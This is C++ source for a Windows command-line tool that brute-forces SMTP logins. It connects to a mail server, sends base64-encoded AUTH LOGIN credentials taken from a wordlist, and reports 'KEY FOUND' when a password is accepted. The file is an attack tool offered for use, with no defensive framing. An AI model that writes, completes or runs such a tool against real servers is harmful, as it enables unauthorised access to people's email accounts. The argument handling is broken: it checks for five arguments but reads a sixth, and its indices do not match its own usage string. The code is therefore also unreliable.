#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <winsock2.h>
#include <windows.h>
#include "smtp_bruteforce.h"

#pragma comment(lib, "ws2_32.lib")

using namespace std;

#define MAX_BUFFER_SIZE 1024

// Base64 encoding table
const string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/"
    "=";

// Base64 encoding function
string base64Encode(const string &in) {
    string out;
    int val = 0, valb = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) {
        out.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    }
    while (out.size() % 4) {
        out.push_back('=');
    }
    return out;
}

// Function to initialize Winsock
bool initWinsock() {
    WSADATA wsaData;
    return WSAStartup(MAKEWORD(2, 2), &wsaData) == 0;
}

// Function to establish connection to the SMTP server
SOCKET connectToSMTPServer(const string &hostname, int port) {
    sockaddr_in server;
    SOCKET sock;
    hostent *host = gethostbyname(hostname.c_str());
    
    if (host == nullptr) {
        cerr << "Error: Unable to resolve hostname" << endl;
        return INVALID_SOCKET;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        cerr << "Error: Unable to create socket" << endl;
        return INVALID_SOCKET;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr = *((in_addr*)host->h_addr_list[0]);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        cerr << "Error: Unable to connect to the server" << endl;
        closesocket(sock);
        return INVALID_SOCKET;
    }

    return sock;
}

// Function to send data to the SMTP server
bool sendData(SOCKET sock, const string &data) {
    if (send(sock, data.c_str(), data.size(), 0) == SOCKET_ERROR) {
        cerr << "Error: Unable to send data" << endl;
        return false;
    }
    return true;
}

// Function to receive data from the SMTP server
string receiveData(SOCKET sock) {
    char buffer[MAX_BUFFER_SIZE];
    int bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (bytesReceived == SOCKET_ERROR) {
        cerr << "Error: Unable to receive data" << endl;
        return "";
    }
    buffer[bytesReceived] = '\0';
    return string(buffer);
}

// Function to brute-force the SMTP login
bool bruteForceSMTP(const string &username, const string &password, const string &hostname, int port) {
    SOCKET sock = connectToSMTPServer(hostname, port);
    if (sock == INVALID_SOCKET) return false;

    // Receive banner
    string banner = receiveData(sock);
    if (banner.find("220") == string::npos) {
        closesocket(sock);
        return false;
    }

    // Send EHLO command
    sendData(sock, "EHLO localhost\r\n");
    receiveData(sock);

    // Send AUTH LOGIN command
    sendData(sock, "AUTH LOGIN\r\n");
    string authResponse = receiveData(sock);
    if (authResponse.find("334") == string::npos) {
        closesocket(sock);
        return false;
    }

    // Send base64 encoded username
    sendData(sock, base64Encode(username) + "\r\n");
    receiveData(sock);

    // Send base64 encoded password
    sendData(sock, base64Encode(password) + "\r\n");
    string loginResponse = receiveData(sock);

    if (loginResponse.find("235") != string::npos) {
        cout << "KEY FOUND: " << password << endl;
        closesocket(sock);
        return true;
    }

    closesocket(sock);
    return false;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        cerr << "Usage: mephisto.exe -l <username> -P <path_to_wordlist> smtp.example.com <port>" << endl;
        return -1;
    }

    string username = argv[2];
    string wordlistPath = argv[4];
    string hostname = argv[3];
    int port = stoi(argv[5]);

    // Load wordlist
    ifstream wordlist(wordlistPath);
    if (!wordlist.is_open()) {
        cerr << "Error: Unable to open wordlist file" << endl;
        return -1;
    }

    string password;
    while (getline(wordlist, password)) {
        if (bruteForceSMTP(username, password, hostname, port)) {
            return 0;
        }
    }

    cout << "KEY NOT FOUND" << endl;
    wordlist.close();
    return 0;
}
